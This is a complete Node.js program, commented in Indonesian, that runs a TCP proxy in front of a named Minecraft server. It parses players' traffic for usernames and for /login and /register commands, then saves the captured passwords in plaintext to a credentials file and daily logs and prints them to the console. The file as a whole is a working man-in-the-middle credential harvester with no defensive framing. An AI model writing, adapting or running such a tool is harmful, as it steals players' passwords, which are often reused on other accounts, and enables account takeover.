'use strict';

const net  = require('net');
const dns  = require('dns');
const fs   = require('fs');
const fsp  = fs.promises;
const path = require('path');

// ================= CONFIG =================
const PROXY_HOST     = '0.0.0.0';
const PROXY_PORT     = 26744
const SERVER_ADDRESS  = 'madeswara.mc-syncara.my.id';
const SERVER_PORT    = 25653;

const LOGS_DIR     = 'logs';
const DATABASE_DIR = 'database';
const CREDS_FILE   = path.join(DATABASE_DIR, 'creds.json');

const HARI_INDONESIA = {
  Monday: 'Senin',
  Tuesday: 'Selasa',
  Wednesday: 'Rabu',
  Thursday: 'Kamis',
  Friday: 'Jumat',
  Saturday: 'Sabtu',
  Sunday: 'Minggu'
};

const Color = {
  RED: '\x1b[91m',
  GREEN: '\x1b[92m',
  YELLOW: '\x1b[93m',
  BLUE: '\x1b[94m',
  CYAN: '\x1b[96m',
  WHITE: '\x1b[97m',
  MAGENTA: '\x1b[95m',
  RESET: '\x1b[0m',
  BOLD: '\x1b[1m'
};

// ================= UTIL: DATE =================

const DAY_NAMES_EN = ['Sunday','Monday','Tuesday','Wednesday','Thursday','Friday','Saturday'];

function pad2(n) { return n.toString().padStart(2, '0'); }

function formatDateParts(date = new Date()) {
  return {
    dd: pad2(date.getDate()),
    mm: pad2(date.getMonth() + 1),
    yyyy: date.getFullYear().toString(),
    hariEn: DAY_NAMES_EN[date.getDay()],
    HH: pad2(date.getHours()),
    MM: pad2(date.getMinutes()),
    SS: pad2(date.getSeconds())
  };
}

function nowTimestamp() {
  const p = formatDateParts();
  return `${p.yyyy}-${p.mm}-${p.dd} ${p.HH}:${p.MM}:${p.SS}`;
}

// ================= UTIL: FS =================

function ensureDirs() {
  fs.mkdirSync(LOGS_DIR, { recursive: true });
  fs.mkdirSync(DATABASE_DIR, { recursive: true });
}

function getLogFilename() {
  const p = formatDateParts();
  const hariId = HARI_INDONESIA[p.hariEn] || p.hariEn;
  const filename = `logs-${p.dd}-${hariId}-${p.mm}-${p.yyyy}.json`;
  return path.join(LOGS_DIR, filename);
}

function logPrint(message, color = Color.WHITE) {
  console.log(`${color}${message}${Color.RESET}`);
}

// -------- simple per-file async lock (serialize read-modify-write) --------
const fileLocks = new Map();

function withFileLock(filepath, fn) {
  const prev = fileLocks.get(filepath) || Promise.resolve();
  const next = prev
    .then(() => fn())
    .catch((err) => {
      logPrint(`[ERROR] Task gagal (${filepath}): ${err.message}`, Color.RED);
    });
  fileLocks.set(filepath, next);
  return next;
}

async function loadJsonFile(filepath, defaultFactory) {
  try {
    if (fs.existsSync(filepath)) {
      const raw = await fsp.readFile(filepath, 'utf-8');
      return JSON.parse(raw);
    }
  } catch (e) {
    logPrint(`[ERROR] Gagal load ${filepath}: ${e.message}`, Color.RED);
  }
  return typeof defaultFactory === 'function' ? defaultFactory() : defaultFactory;
}

async function saveJsonFile(filepath, data) {
  try {
    const temp = filepath + '.tmp';
    await fsp.writeFile(temp, JSON.stringify(data, null, 2), 'utf-8');
    await fsp.rename(temp, filepath);
  } catch (e) {
    logPrint(`[ERROR] Gagal save ${filepath}: ${e.message}`, Color.RED);
  }
}

function defaultLogs() {
  const now = new Date();
  const p = formatDateParts(now);
  const hariId = HARI_INDONESIA[p.hariEn] || p.hariEn;
  return {
    info: {
      tanggal: `${p.dd}-${p.mm}-${p.yyyy}`,
      hari: hariId,
      dibuat_pada: now.toISOString()
    },
    logs: []
  };
}

async function logsAppend(line) {
  const logFile = getLogFilename();
  await withFileLock(logFile, async () => {
    const data = await loadJsonFile(logFile, defaultLogs);
    data.logs.push(line);
    await saveJsonFile(logFile, data);
  });
}

function logEventJoin(username, ip, port) {
  const ts = nowTimestamp();
  logsAppend(`[${ts}] JOIN | ${username} | IP: ${ip}:${port}`);
}

function logEventLeave(username, ip, durationSec) {
  const ts = nowTimestamp();
  const h = Math.floor(durationSec / 3600);
  const m = Math.floor((durationSec % 3600) / 60);
  const s = durationSec % 60;
  logsAppend(`[${ts}] LEAVE | ${username} | IP: ${ip} | Durasi: ${pad2(h)}:${pad2(m)}:${pad2(s)}`);
}

function logEventAuth(username, ip, action, password) {
  const ts = nowTimestamp();
  logsAppend(`[${ts}] ${action} | ${username} | IP: ${ip} | Password: ${password}`);
}

// ---------------- CREDS (username : password saja) ----------------

async function credsSave(username, password) {
  await withFileLock(CREDS_FILE, async () => {
    const data = await loadJsonFile(CREDS_FILE, () => ({}));
    data[username] = password;
    await saveJsonFile(CREDS_FILE, data);
  });
}

// ---------------- NETWORK HELPERS ----------------

function resolveAddress(address) {
  return new Promise((resolve) => {
    if (net.isIPv4(address)) {
      resolve(address);
      return;
    }
    dns.lookup(address, (err, ip) => {
      if (err) {
        logPrint(`[ERROR] Tidak dapat resolve: ${address}`, Color.RED);
        resolve(null);
      } else {
        logPrint(`[INFO] Domain '${address}' -> ${ip}`, Color.CYAN);
        resolve(ip);
      }
    });
  });
}

// ---------------- VARINT / PACKET PARSING ----------------

function readVarint(data, offset = 0) {
  let result = 0;
  let shift = 0;
  while (shift < 35) {
    if (offset >= data.length) return [null, offset];
    const byte = data[offset];
    offset += 1;
    result |= (byte & 0x7F) << shift;
    if ((byte & 0x80) === 0) return [result, offset];
    shift += 7;
  }
  return [null, offset];
}

function splitPackets(data) {
  const packets = [];
  let offset = 0;
  while (offset < data.length) {
    const start = offset;
    const [pktLen, newOffset] = readVarint(data, offset);
    if (pktLen === null) {
      packets.push(data.slice(offset));
      break;
    }
    if (pktLen <= 0) {
      offset = newOffset;
      continue;
    }
    const end = newOffset + pktLen;
    if (end > data.length) {
      packets.push(data.slice(start));
      break;
    }
    packets.push(data.slice(newOffset, end));
    offset = end;
  }
  return packets;
}

const COMMAND_PATTERN = /^\/[a-zA-Z][a-zA-Z0-9_]*(\s.*)?$/;

function isRealCommand(text) {
  if (!text || !text.startsWith('/')) return false;
  if (text.length < 2 || text.length > 256) return false;
  for (const c of text) {
    if (c.charCodeAt(0) < 32) return false;
  }
  if (text.includes('\x00') || text.includes('\ufffd')) return false;
  if (!COMMAND_PATTERN.test(text)) return false;
  return true;
}

const utf8Decoder = new TextDecoder('utf-8', { fatal: true });

function decodeUtf8Strict(buf) {
  try {
    return utf8Decoder.decode(buf);
  } catch (e) {
    return null;
  }
}

function extractCommandsFromPacket(packetBody) {
  const results = [];
  const seen = new Set();

  for (let startOffset = 0; startOffset < packetBody.length; startOffset++) {
    const [length, strStart] = readVarint(packetBody, startOffset);
    if (length === null || length <= 0 || length > 256) continue;
    if (strStart + length > packetBody.length) continue;
    const raw = packetBody.slice(strStart, strStart + length);
    if (raw.includes(0)) continue;
    const text = decodeUtf8Strict(raw);
    if (text === null) continue;
    if (!text.startsWith('/')) continue;
    if (seen.has(text)) continue;
    if (isRealCommand(text)) {
      seen.add(text);
      results.push(text);
    }
  }

  return results;
}

// ---------------- LOGIN / REGISTER PARSER ----------------

const LOGIN_CMD_REGEX    = /^\/(?:login|log|l)\s+(\S+)$/i;
const REGISTER_CMD_REGEX = /^\/(?:register|reg|r)\s+(\S+)(?:\s+\S+)?$/i;

function parseAuthCommand(command) {
  let m = command.match(LOGIN_CMD_REGEX);
  if (m) return { action: 'LOGIN', password: m[1] };
  m = command.match(REGISTER_CMD_REGEX);
  if (m) return { action: 'REGISTER', password: m[1] };
  return { action: null, password: null };
}

// ---------------- USERNAME EXTRACTION ----------------

const USERNAME_REGEX = /^[a-zA-Z0-9_]{3,16}$/;
const USERNAME_BLACKLIST = new Set([
  'localhost', 'minecraft', 'client', 'server',
  'java', 'version', 'release', 'snapshot',
  'com', 'net', 'org', 'www', 'http', 'https',
  'true', 'false', 'null', 'void', 'class',
  'public', 'private', 'static', 'final',
  'forge', 'fabric', 'optifine', 'sodium',
  'play', 'join', 'login', 'register'
]);

function extractUsernameFromData(data) {
  const candidates = [];

  for (const pkt of splitPackets(data)) {
    if (pkt.length < 2) continue;
    for (let startOffset = 0; startOffset < pkt.length; startOffset++) {
      const [length, strStart] = readVarint(pkt, startOffset);
      if (length === null || length < 3 || length > 16) continue;
      if (strStart + length > pkt.length) continue;
      const raw = pkt.slice(strStart, strStart + length);
      const text = decodeUtf8Strict(raw);
      if (text === null) continue;
      if (USERNAME_REGEX.test(text) && !USERNAME_BLACKLIST.has(text.toLowerCase())) {
        candidates.push(text);
      }
    }
  }

  try {
    const decoded = data.toString('latin1');
    const matches = decoded.match(/[a-zA-Z0-9_]{3,16}/g) || [];
    for (const word of matches) {
      if (
        USERNAME_REGEX.test(word) &&
        !USERNAME_BLACKLIST.has(word.toLowerCase()) &&
        !/^\d+$/.test(word)
      ) {
        candidates.push(word);
      }
    }
  } catch (e) {
    // ignore
  }

  if (candidates.length === 0) return null;

  const seen = new Set();
  const unique = [];
  for (const c of candidates) {
    if (!seen.has(c)) {
      seen.add(c);
      unique.push(c);
    }
  }

  const valid = unique.filter(
    (c) => c.length >= 3 && c.length <= 16 && !/^\d+$/.test(c) && USERNAME_REGEX.test(c)
  );

  return valid.length > 0 ? valid[0] : null;
}

// ---------------- CONNECTION STATE ----------------

class ConnectionState {
  constructor(ip, port) {
    this.ip = ip;
    this.port = port;
    this.username = `Unknown_${ip}`;
    this.usernameSet = false;
    this.loginTime = new Date();
    this.recentCmds = [];
    this.MAX_RECENT = 20;
  }

  setUsername(name) {
    if (!this.usernameSet && name) {
      this.username = name;
      this.usernameSet = true;
      return true;
    }
    return false;
  }

  isDuplicate(text) {
    if (this.recentCmds.includes(text)) return true;
    this.recentCmds.push(text);
    if (this.recentCmds.length > this.MAX_RECENT) this.recentCmds.shift();
    return false;
  }
}

// ---------------- DATA HANDLERS ----------------

function handleC2sData(data, state) {
  const timestamp = nowTimestamp();

  if (!state.usernameSet) {
    const username = extractUsernameFromData(data);
    if (username) {
      if (state.setUsername(username)) {
        logEventJoin(username, state.ip, state.port);
        const msg = `[${timestamp}] JOIN | ${username} (${state.ip}:${state.port})`;
        logPrint(`\n${'='.repeat(60)}`, Color.CYAN);
        logPrint(msg, Color.CYAN);
        logPrint('='.repeat(60), Color.CYAN);
      }
    }
  }

  if (!state.usernameSet) return;

  for (const pktBody of splitPackets(data)) {
    if (pktBody.length < 2) continue;
    for (const cmd of extractCommandsFromPacket(pktBody)) {
      if (state.isDuplicate(cmd)) continue;

      const { action, password } = parseAuthCommand(cmd);
      if (action && password) {
        credsSave(state.username, password);
        logEventAuth(state.username, state.ip, action, password);

        const msg = `[${timestamp}] ${action} | ${state.username} (${state.ip}) | Password: ${password}`;
        const color = action === 'LOGIN' ? Color.GREEN : Color.MAGENTA;
        logPrint(`🔐 ${msg}`, color);
      }
    }
  }
}

function handleS2cData(data, state) {
  // tidak digunakan
}

// ---------------- PROXY CORE ----------------

function handleClient(clientSocket) {
  const ip = (clientSocket.remoteAddress || '').replace('::ffff:', '');
  const port = clientSocket.remotePort;
  const state = new ConnectionState(ip, port);

  let serverSocket = null;
  let closed = false;

  function finalizeConnection() {
    if (closed) return;
    closed = true;

    if (state.usernameSet) {
      const timestamp = nowTimestamp();
      const durationSec = Math.floor((Date.now() - state.loginTime.getTime()) / 1000);
      const h = Math.floor(durationSec / 3600);
      const m = Math.floor((durationSec % 3600) / 60);
      const s = durationSec % 60;

      const msg = `[${timestamp}] LEAVE | ${state.username} (${state.ip}) | Durasi: ${pad2(h)}:${pad2(m)}:${pad2(s)}`;
      logPrint(`\n${'='.repeat(60)}`, Color.RED);
      logPrint(msg, Color.RED);
      logPrint(`${'='.repeat(60)}\n`, Color.RED);

      logEventLeave(state.username, state.ip, durationSec);
    }

    try { clientSocket.destroy(); } catch (e) {}
    if (serverSocket) {
      try { serverSocket.destroy(); } catch (e) {}
    }
  }

  resolveAddress(SERVER_ADDRESS).then((serverIp) => {
    if (!serverIp) {
      clientSocket.destroy();
      return;
    }

    serverSocket = net.connect({ host: serverIp, port: SERVER_PORT }, () => {
      clientSocket.setNoDelay(true);
      serverSocket.setNoDelay(true);
      logPrint(`[CONNECT] ${ip}:${port} -> ${SERVER_ADDRESS}:${SERVER_PORT}`, Color.MAGENTA);
    });

    clientSocket.on('data', (data) => {
      try {
        handleC2sData(data, state);
      } catch (e) {
        logPrint(`[ERROR] handleC2sData: ${e.message}`, Color.RED);
      }
      if (serverSocket && !serverSocket.destroyed) {
        serverSocket.write(data);
      }
    });

    serverSocket.on('data', (data) => {
      try {
        handleS2cData(data, state);
      } catch (e) {
        logPrint(`[ERROR] handleS2cData: ${e.message}`, Color.RED);
      }
      if (clientSocket && !clientSocket.destroyed) {
        clientSocket.write(data);
      }
    });

    clientSocket.on('close', finalizeConnection);
    clientSocket.on('error', finalizeConnection);
    serverSocket.on('close', finalizeConnection);
    serverSocket.on('error', (err) => {
      if (err && err.code === 'ECONNREFUSED') {
        logPrint(`[ERROR] Server menolak koneksi dari ${ip}`, Color.RED);
      }
      finalizeConnection();
    });
  });
}

// ---------------- MAIN ----------------

async function main() {
  ensureDirs();

  if (!fs.existsSync(CREDS_FILE)) {
    await saveJsonFile(CREDS_FILE, {});
  }

  const logFile = getLogFilename();
  if (!fs.existsSync(logFile)) {
    await saveJsonFile(logFile, defaultLogs());
  }

  const server = net.createServer((clientSocket) => {
    handleClient(clientSocket);
  });

  server.on('error', (err) => {
    if (err.code === 'EACCES') {
      logPrint(`[ERROR] Port ${PROXY_PORT} butuh akses root/admin`, Color.RED);
    } else {
      logPrint(`[ERROR] Bind gagal: ${err.message}`, Color.RED);
    }
    process.exit(1);
  });

  server.listen(PROXY_PORT, PROXY_HOST, () => {
    const timestamp = nowTimestamp();
    const p = formatDateParts();
    const hariId = HARI_INDONESIA[p.hariEn] || '';

    logPrint('='.repeat(60), Color.BOLD);
    logPrint('  MINECRAFT PROXY LOGGER', Color.BOLD);
    logPrint('='.repeat(60), Color.BOLD);
    logPrint(`  Started  : ${timestamp} (${hariId})`, Color.WHITE);
    logPrint(`  Proxy    : ${PROXY_HOST}:${PROXY_PORT}`, Color.WHITE);
    logPrint(`  Target   : ${SERVER_ADDRESS}:${SERVER_PORT}`, Color.WHITE);
    logPrint(`  Logs     : ${logFile}`, Color.WHITE);
    logPrint(`  Creds    : ${CREDS_FILE}`, Color.WHITE);
    logPrint('='.repeat(60), Color.BOLD);
    logPrint('  Tracking : JOIN | LEAVE | LOGIN | REGISTER', Color.GREEN);
    logPrint('='.repeat(60) + '\n', Color.BOLD);
  });

  process.on('SIGINT', () => {
    logPrint('\n[INFO] Proxy dihentikan.', Color.YELLOW);
    server.close(() => process.exit(0));
    setTimeout(() => process.exit(0), 1000);
  });
}

main();